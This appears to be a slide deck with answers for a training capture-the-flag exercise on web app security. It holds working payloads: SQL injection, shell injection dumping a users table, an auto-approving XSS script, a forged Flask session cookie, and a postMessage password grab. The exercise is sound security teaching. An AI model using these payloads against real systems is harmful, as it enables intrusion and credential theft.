# Marketplace security CTF

*Please note:* this presentation contains the answers.
---
# What is it?
Find security holes in apps.

Multiple rounds getting harder each round.

Around 10-15 mins per round.

Followed by discussion.
---
# Don't panic
If you can't get the answers.
---
# To run
Set up a python virtualenv (eg: marketplace-ctf)

Install:

```bash
pip install Flask
pip install python-memcached
pip install requests
```
---
# Also
Optional:

```bash
brew install phantomjs
```
---
# Although...
All things are local and you could just open the db or the secret file or whatever... and read it.

That won't work when you try to repeat it on my server.
---
# Do not
DOS

rm -rf
---
# Round 1
My cool app requires a username and password to get in. It's really, really well protected (not).

Goal: **Log in**
---
# Round 1
Answers
---
# Round 1
SQL Injection

set password to:

```sql
' OR '1
```
---
# Round 2
The admin user keeps forgetting their password. So I added a hint to remind them.

Goal: **Log in**
---
# Round 2
Answers
---
# Round 2
Shell injection

set username to:

```bash
admin;sqlite3 the.db "SELECT * FROM users";#
```
---
# Round 3
We've written this cool way to review web apps. Add an app as some JSON and reviewers will access the review page. Reviewers will visit any URL given in the JSON.

Goal: **Access the review page**
---
# Round 3
Answers
---
# Round 3
Referer leaking

upload an app format:

```json
{"url": "http://localhost:9999"}
```
---
# Round 3
Then run a server that looks like this:

```python
from flask import Flask, request
app = Flask(__name__)

@app.route('/')
def test():
    print request.headers
    return 'done'

if __name__ == '__main__':
    app.debug = True
    app.run(host='0.0.0.0', port=9999)
```
---
# Round 3
HTTPS to HTTP *No referrer*

HTTPS to HTTPS *Referrer shown*

See: http://mzl.la/1e8Kz0f

And: http://bit.ly/1dHDrmE
---
# Round 4
So we've closed down the hole in Round 3. And added a description field where you can add some HTML. Also actually added a working Approve and Deny button.

Goal: **Approve your app**

# Round 4

# Round 4
XSS

```json
{"url": "http://foo.com",
"description": "&lt;script>window.onload = function() {
    document.getElementsByTagName('input')[1].click();
}&lt;/script>"}
```
---
# Round 5
This is really similar to round 1, except without the SQL Injection.

Goal: **Get logged in**

# Round 5
Fake cookie

```python
import hashlib

import requests
from flask.sessions import TaggedJSONSerializer
from itsdangerous import URLSafeTimedSerializer

url = URLSafeTimedSerializer('is-it-really-bad-if-this-is-shared',
                             salt='cookie-session',
                             serializer=TaggedJSONSerializer(),
                             signer_kwargs={'key_derivation': 'hmac',
                                            'digest_method': hashlib.sha1})

cookie = url.dumps({'user': 'admin'})
res = requests.get('http://localhost:5000', cookies={'session': cookie })
assert 'So logged in' in res.text
```
---
# Round 6
All the holes are closed. We set up a cool app at: http://www.agmweb.ca/files/app.html to remember passwords.

Goal: **Give me a URL that will show the password somehow**

Note: **I will click to allow popups on any URL you give me**

# Round 6
use ```windows.postMessage```

```js
        var hack = function() {
          popup.postMessage('localhost', '*');
        };

        var receiveMessage = function(event) {
          alert(event.data);
        };

        popup = window.open('http://www.agmweb.ca/files/app.html',
              'pwmanager', 'width=400,height=300,resizable,scrollbars=yes,status=1');

        window.setTimeout(hack, 500);
        window.addEventListener("message", receiveMessage, false);
```

# Security bugs
There is a classification of security bugs.

https://wiki.mozilla.org/Security_Severity_Ratings

A very small portion of security bugs use this clasification, we should do that more.
